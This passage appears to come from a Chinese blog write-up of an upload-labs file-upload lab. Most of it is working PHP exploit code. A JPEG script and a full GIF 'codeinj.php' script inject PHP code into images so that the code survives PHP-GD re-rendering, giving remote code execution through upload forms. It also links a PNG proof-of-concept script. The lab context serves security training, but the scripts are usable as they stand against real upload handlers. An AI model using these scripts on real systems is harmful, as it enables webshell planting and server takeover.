class=\"line\">\t\t\t\t\t\tsubstr(</span><br><span class=\"line\">\t\t\t\t\t\t\tstr_repeat(<span class=\"string\">\"\\0\"</span>,$nullbytePayloadSize).</span><br><span class=\"line\">\t\t\t\t\t\t\t\tsubstr($outStream, $startPos, $imageStreamSize),</span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t\t\t\t\t\t$nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class=\"line\">\t\t\t\t\t\t\t\tsubstr($outStream, $stopPos);</span><br><span class=\"line\">\t\t\t\t&#125; <span class=\"keyword\">elseif</span>($correctImage) &#123;</span><br><span class=\"line\">\t\t\t\t\t$outStream = $outStreamTmp;</span><br><span class=\"line\">\t\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(checkImage(<span class=\"string\">'payload_'</span>.$argv[<span class=\"number\">1</span>], $outStream)) &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Success!'</span>);</span><br><span class=\"line\">\t\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tunlink(<span class=\"string\">'payload_'</span>.$argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t<span class=\"keyword\">die</span>(<span class=\"string\">'Something\\'s wrong'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkImage</span><span class=\"params\">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> $correctImage;</span><br><span class=\"line\">\t\tfile_put_contents($filename, $data);</span><br><span class=\"line\">\t\t$correctImage = <span class=\"keyword\">TRUE</span>;</span><br><span class=\"line\">\t\timagecreatefromjpeg($filename);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>($unlink)</span><br><span class=\"line\">\t\t\tunlink($filename);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> $correctImage;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">custom_error_handler</span><span class=\"params\">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> $extraBytes, $correctImage;</span><br><span class=\"line\">\t\t$correctImage = <span class=\"keyword\">FALSE</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/(\\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($m[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\">\t\t\t\t$extraBytes = (int)$m[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DataInputStream</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">private</span> $binData;</span><br><span class=\"line\">\t\t<span class=\"keyword\">private</span> $order;</span><br><span class=\"line\">\t\t<span class=\"keyword\">private</span> $size;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;binData = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;order = $order;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(!$fromString) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'File not exists ['</span>.$filename.<span class=\"string\">']'</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">$this</span>-&gt;binData = $filename;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;size = strlen(<span class=\"keyword\">$this</span>-&gt;binData);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">seek</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> (<span class=\"keyword\">$this</span>-&gt;size - strlen(<span class=\"keyword\">$this</span>-&gt;binData));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">skip</span><span class=\"params\">($skip)</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;binData = substr(<span class=\"keyword\">$this</span>-&gt;binData, $skip);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readByte</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;eof()) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'End Of File'</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t$byte = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">0</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;binData = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> ord($byte);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readShort</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(strlen(<span class=\"keyword\">$this</span>-&gt;binData) &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'End Of File'</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t$short = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">0</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;binData = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;order) &#123;</span><br><span class=\"line\">\t\t\t\t$short = (ord($short[<span class=\"number\">1</span>]) &lt;&lt; <span class=\"number\">8</span>) + ord($short[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t$short = (ord($short[<span class=\"number\">0</span>]) &lt;&lt; <span class=\"number\">8</span>) + ord($short[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> $short;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">eof</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> !<span class=\"keyword\">$this</span>-&gt;binData||(strlen(<span class=\"keyword\">$this</span>-&gt;binData) === <span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/016_3.png\" alt=\"016_3\"></p>\n<h3 id=\"gif\"><a href=\"#gif\" class=\"headerlink\" title=\"gif:\"></a>gif:</h3><p>可以通过对比gif图删剪部分,可以尝试把payload插入到未修改部分。这里也有脚本帮助啊。</p>\n<p><code>https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE</code></p>\n<h4 id=\"脚本-1\"><a href=\"#脚本-1\" class=\"headerlink\" title=\"脚本\"></a>脚本</h4><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Author: rickchen.vip(at)gmail.com</span><br><span class=\"line\"> * Date: 2015-04-05</span><br><span class=\"line\"> * Desc: Use Similar-Block-Attack to bypass PHP-GD process to RCE</span><br><span class=\"line\"> * Reference: http://www.secgeek.net/bookfresh-vulnerability/</span><br><span class=\"line\"> * Usage: php codeinj.php demo.gif \"&lt;?php phpinfo();?&gt;\"</span><br><span class=\"line\"><span class=\"php\"> */</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">gd_process</span><span class=\"params\">($src_img, $dst_img)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">try</span> &#123;</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"comment\"># you can redefine the GD process</span></span></span><br><span class=\"line\"><span class=\"php\">        $im = imagecreatefromgif($src_img);</span></span><br><span class=\"line\"><span class=\"php\">        imagegif($im, $dst_img);</span></span><br><span class=\"line\"><span class=\"php\">    &#125; <span class=\"keyword\">catch</span> (<span class=\"keyword\">Exception</span> $e) &#123;</span></span><br><span class=\"line\"><span class=\"php\">        printf(<span class=\"string\">\"%s\\n\"</span>, $e-&gt;getMessage());</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">find_similar_block</span><span class=\"params\">($src_img, $dst_img, $block_len, $slow=false)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $src_data = fread(fopen($src_img, <span class=\"string\">\"rb\"</span>), filesize($src_img));</span></span><br><span class=\"line\"><span class=\"php\">    $dst_data = fread(fopen($dst_img, <span class=\"string\">\"rb\"</span>), filesize($dst_img));</span></span><br><span class=\"line\"><span class=\"php\">    $src_index = <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"php\">    $pre_match_array = <span class=\"keyword\">array</span>();</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">while</span> ($src_index &lt; (strlen($src_data) - $block_len)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">        $find_data = substr($src_data, $src_index, $block_len);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">        $dst_index = <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"php\">        $found = <span class=\"keyword\">false</span>;</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">while</span> ($dst_index &lt; (strlen($dst_data) - $block_len)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">            $temp_data = substr($dst_data, $dst_index, $block_len);</span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"keyword\">if</span> (<span class=\"number\">0</span> === strcmp($find_data, $temp_data)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">                $match = <span class=\"keyword\">array</span>(</span></span><br><span class=\"line\"><span class=\"php\">                    <span class=\"string\">\"src_offset\"</span> =&gt; $src_index,</span></span><br><span class=\"line\"><span class=\"php\">                    <span class=\"string\">\"dst_offset\"</span> =&gt; $dst_index</span></span><br><span class=\"line\"><span class=\"php\">                );</span></span><br><span class=\"line\"><span class=\"php\">                $pre_match_array[] = $match;</span></span><br><span class=\"line\"><span class=\"php\">                $found = <span class=\"keyword\">true</span>;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\">                /*</span><br><span class=\"line\">                printf(\"Similar block found&gt; src_offset: %d\\n\", $src_index);</span><br><span class=\"line\">                printf(\"                     dst_offset: %d\\n\", $dst_index);</span><br><span class=\"line\">                printf(\"                   similar_data: %s\\n\", str2hex($temp_data));</span><br><span class=\"line\">                printf(\"                 similar_length: %s\\n\\n\", strlen($temp_data));</span><br><span class=\"line\"><span class=\"php\">                */</span></span><br><span class=\"line\"><span class=\"php\">            &#125;</span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"keyword\">if</span> ($found &amp;&amp; $slow == <span class=\"keyword\">false</span>)</span></span><br><span class=\"line\"><span class=\"php\">                $dst_index += $block_len;</span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"php\">                $dst_index++;</span></span><br><span class=\"line\"><span class=\"php\">        &#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">if</span> ($found &amp;&amp; $slow == <span class=\"keyword\">false</span>)</span></span><br><span class=\"line\"><span class=\"php\">            $src_index += $block_len;</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"php\">            $src_index++;</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> $pre_match_array;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">inject_code_to_src_img</span><span class=\"params\">($src_img, $pre_match_array, $injection_code)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $src_data = fread(fopen($src_img, <span class=\"string\">\"rb\"</span>), filesize($src_img));</span></span><br><span class=\"line\"><span class=\"php\">    $inj_len = strlen($injection_code);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    $find_n = <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">foreach</span> ($pre_match_array <span class=\"keyword\">as</span> $similar_block) &#123;</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"comment\">#printf(\"Trying inject code to source image with offset: %d, length: %d\\n\", $similar_block[\"src_offset\"], $inj_len);</span></span></span><br><span class=\"line\"><span class=\"php\">        $mod_src_data = substr($src_data, <span class=\"number\">0</span>, $similar_block[<span class=\"string\">\"src_offset\"</span>]).$injection_code.substr($src_data, $similar_block[<span class=\"string\">\"src_offset\"</span>] + $inj_len);</span></span><br><span class=\"line\"><span class=\"php\">        $temp_img = sys_get_temp_dir().<span class=\"string\">\"/\"</span>.$src_img.<span class=\"string\">\".mod\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">        $temp_cvt_img = $temp_img.<span class=\"string\">\".gd\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">        fwrite(fopen($temp_img, <span class=\"string\">\"wb\"</span>), $mod_src_data);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">if</span> (!gd_process($temp_img, $temp_cvt_img)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"comment\">#printf(\"PHP-GD process() the image modified error, offset: %d\\n\", $similar_block[\"src_offset\"]);</span></span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"comment\">#printf(\"                                           length: %d\\n\\n\", $inj_len);</span></span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"keyword\">continue</span>;</span></span><br><span class=\"line\"><span class=\"php\">        &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"keyword\">if</span> (check_code($temp_cvt_img, $injection_code)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">                $fuck_img = <span class=\"string\">\"gd_\"</span>.$src_img;</span></span><br><span class=\"line\"><span class=\"php\">                fwrite(fopen($fuck_img, <span class=\"string\">\"wb\"</span>), $mod_src_data);</span></span><br><span class=\"line\"><span class=\"php\">                printf(<span class=\"string\">\"Inject code to source image successful with offset: %d\\n\"</span>, $similar_block[<span class=\"string\">\"src_offset\"</span>]);</span></span><br><span class=\"line\"><span class=\"php\">                printf(<span class=\"string\">\"Saving result \\\"%s\\\", have fun! :)\\n\"</span>, $fuck_img);</span></span><br><span class=\"line\"><span class=\"php\">                <span class=\"keyword\">exit</span>;</span></span><br><span class=\"line\"><span class=\"php\">            &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"php\">                <span class=\"keyword\">continue</span>;</span></span><br><span class=\"line\"><span class=\"php\">                <span class=\"comment\">#printf(\"Modified image doesn't work well, offset: %d, retry...\\n\", $similar_block[\"src_offset\"]);</span></span></span><br><span class=\"line\"><span class=\"php\">            &#125;</span></span><br><span class=\"line\"><span class=\"php\">        &#125;</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_code</span><span class=\"params\">($src_img, $injection_code)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $data = fread(fopen($src_img, <span class=\"string\">\"rb\"</span>), filesize($src_img));</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> strpos($data, $injection_code);</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">str2hex</span><span class=\"params\">($str)</span></span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $hex = <span class=\"string\">\"\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">for</span> ($i = <span class=\"number\">0</span>; $i &lt; strlen($str); $i++)&#123;</span></span><br><span class=\"line\"><span class=\"php\">        $hex .= sprintf(<span class=\"string\">\"%02x\"</span>, (ord($str[$i])));;</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> $hex;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hex2str</span><span class=\"params\">($hex)</span></span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $str = <span class=\"string\">\"\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">for</span> ($i = <span class=\"number\">0</span>; $i &lt; strlen($hex)<span class=\"number\">-1</span>; $i+=<span class=\"number\">2</span>)&#123;</span></span><br><span class=\"line\"><span class=\"php\">        $str .= chr(hexdec($hex[$i].$hex[$i+<span class=\"number\">1</span>]));</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> $str;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">/* main */</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"keyword\">if</span> ($argc &lt; <span class=\"number\">3</span>) &#123;</span></span><br><span class=\"line\"><span class=\"php\">    printf(<span class=\"string\">\"Usage: php %s &lt;src_img&gt; &lt;inj_code&gt;\\n\"</span>, $argv[<span class=\"number\">0</span>]);</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">exit</span>;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">$slow = <span class=\"keyword\">false</span>;</span></span><br><span class=\"line\"><span class=\"php\">$src_img = $argv[<span class=\"number\">1</span>];</span></span><br><span class=\"line\"><span class=\"php\">$injection_code = $argv[<span class=\"number\">2</span>];</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">$img_info = getimagesize($src_img);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">/* GIF image type value \"1\" */</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"keyword\">if</span> ($img_info[<span class=\"number\">2</span>] == <span class=\"string\">'1'</span>) &#123;</span></span><br><span class=\"line\"><span class=\"php\">    $cvt_img = sys_get_temp_dir().<span class=\"string\">\"/\"</span>.basename($src_img);</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">if</span> (!gd_process($src_img, $cvt_img)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">        printf(<span class=\"string\">\"PHP-GD process() function error, please check out.\\n\"</span>);</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">exit</span>;</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\">&#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"php\">    printf(<span class=\"string\">\"This script only support GIF image.\\n\"</span>);</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">exit</span>;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">$block_len = strlen($injection_code);</span></span><br><span class=\"line\"><span class=\"php\">$pre_match_array = find_similar_block($src_img, $cvt_img, $block_len, $slow);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"keyword\">if</span> (sizeof($pre_match_array)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">    inject_code_to_src_img($src_img, $pre_match_array, $injection_code);</span></span><br><span class=\"line\"><span class=\"php\">&#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"php\">    printf(<span class=\"string\">\"Not found any similar %d bytes block.\\n\"</span>, strlen($injection_code));</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">printf(<span class=\"string\">\"Cant find any useful similar block to inject code, but take it easy. :(\\n\"</span>);</span></span><br></pre></td></tr></table></figure>\n\n<p>用其自带的<code>demo.gif</code>,我这里一次就成功了,不行的话多尝试下换一张图片或者尝试其他payload。</p>\n<p><img src=\"/img/fileupload/upload-labs/016_4.png\" alt=\"016_4\"></p>\n<p><img src=\"/img/fileupload/upload-labs/016_5.png\" alt=\"016_5\"></p>\n<h3 id=\"png\"><a href=\"#png\" class=\"headerlink\" title=\"png:\"></a>png:</h3><p><code>https://raw.githubusercontent.com/hxer/imagecreatefrom-/master/png/poc/poc_png.py</code></p>\n<h4 id=\"脚本-2\"><a href=\"#脚本-2\" class=\"headerlink\" title=\"脚本\"></a>脚本</h4><figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span 